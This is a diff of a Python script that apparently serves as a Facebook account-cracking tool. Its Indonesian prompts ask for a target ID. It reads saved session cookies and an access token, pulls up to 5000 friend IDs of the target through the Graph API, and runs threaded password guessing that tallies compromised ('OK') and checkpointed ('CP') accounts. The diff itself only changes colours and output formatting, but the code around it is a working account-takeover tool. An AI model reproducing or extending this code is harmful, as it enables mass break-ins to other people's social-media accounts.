@@ -1517,7 +1517,7 @@ def brayen_dump():
 		kukis = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
+	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold cyan'))
 	pil = input(f' [+] Masukan ID Target : ')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
@@ -1540,7 +1540,7 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
+		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold cyan"))
 		jum = int(input(f' [+] {P}Mau Berapa Idz Target  : '))
 	except ValueError:
 		print(' [+] Wrong input ')
@@ -1751,8 +1751,8 @@ def passwrd():
 					pool.submit(validate1,idf,pwv)
 		print('')
 	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
-	print(f'  [{h}•{x}]{h} OK : {h}%s '%(ok))
-	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
+	print(f'  [+] OK : {H}{ok} ')
+	print(f'  [+] CP : {K}{cp} ')
 
 #--------------------[ METODE VALIDATE ]-----------------#
 def validate1(idf,pwv):
